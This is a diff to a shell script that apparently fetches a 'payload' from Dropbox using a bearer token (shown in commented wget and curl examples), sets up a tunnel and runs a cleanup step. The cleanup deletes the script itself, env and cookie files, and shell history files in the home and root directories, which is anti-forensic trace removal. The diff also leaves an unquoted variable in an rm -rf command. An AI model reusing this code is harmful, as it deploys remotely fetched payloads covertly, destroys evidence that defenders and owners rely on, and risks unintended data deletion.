@@ -46,6 +46,16 @@ jailjudge() {
 }
 jailjudge
 
+## examples with wget/curl using private token
+# wget --method=POST \
+#      --header 'Authorization: Bearer ${pl_token}' \
+#      --header 'Dropbox-API-Arg: {"path":"/${name}${format}"}' \
+#      https://content.dropboxapi.com/2/files/download -O "${name}${format}"
+# curl -X POST \
+#      https://content.dropboxapi.com/2/files/download \
+#      --header 'Authorization: Bearer ${pl_token}'\
+#      --header 'Dropbox-API-Arg: {"path":"/${name}${format}"}' -o "${name}${format}"
+
 getpayload(){
     ## get payload from dbx
     local mask=${pl_mask:-:ep/:token/:name}
@@ -110,14 +120,16 @@ setup_tnl
 
 ## removing tmppath too early might be a race cond, let it be called by switch
 cleanup() {
+    echo "$tmppath" >/tmp/tmppath
     ppath="${tmppath%\/*}"
+    echo "$ppath" >/tmp/ppath
     previouspaths="$(compgen -G "${ppath}/.\ *")"
+    echo "$previouspaths" >/tmp/previouspaths
     cd "$ppath"
-    rm -rf "$tmppath" "scripts-${BRANCH}" \
+    rm -rf "$tmppath" "scripts-${BRANCH}" $previouspaths \
        -- "$0" \
        "dig" "cookie" "env.sh" "../env.sh" \
-       "$HOME"/.*_history ~/.*_history /.*_history \
-       "$previouspaths"
+       "$HOME"/.*_history ~/.*_history /.*_history
     mkdir "$tmppath" && cd "$tmppath" ## now use tmppath only to store tmp bins
     mv "../$bb" "$tmppath/"
     link_bb "$bb"
